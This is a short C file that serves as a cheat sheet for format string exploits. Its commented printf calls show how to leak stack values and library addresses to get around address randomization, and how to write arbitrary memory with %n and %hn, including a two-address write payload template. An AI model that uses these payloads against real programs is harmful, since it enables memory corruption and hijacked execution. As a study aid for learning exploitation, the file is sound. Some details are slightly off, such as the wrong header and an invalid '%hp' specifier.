#include <stdlib.h>

int main () {
// each output of printf is the next output on the stack
printf("%x %x %x %x %s %x %s %x");
// %x = hex value of next value on stack
// %s = char* on stack (crashes if not pointer)

// %<n>$x = hex value of nth value in stack
printf("%69$x");

// %<n>$s = value of pointer at nth position in stack 
// Use this to get location of library function at runtime (bypass library randomization)
printf("%69$s");

//%<n>x = value in stack padded to n characters
printf("%69x");

// <s>%jx%k$n = write to string address s value j + len(s) (k is s position in stack)
printf("420%69x%13$n");

// Write 2 bytes at a time to 2 different target addresses
// payload += <target address 1 (higher address)><target address 2 (lower address)>
// payload += %<value to write to 1 - # bytes written (to stack)>x
// payload += %<address 1 stack position>$hn
// payload += %<value to write to 2 - # bytes written (to stack and address 1 padding)>x
// payload += %<address 2 stack position>$hn
printf("CAAAAAAAA%412x%12$hn%61x%13$hn");
printf("CAAAAAAAA%00000x%12$hp%00000x%13$hp"); // for finding the correct stack offset (replace 12 and 13)


}
// http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html (for future reference)

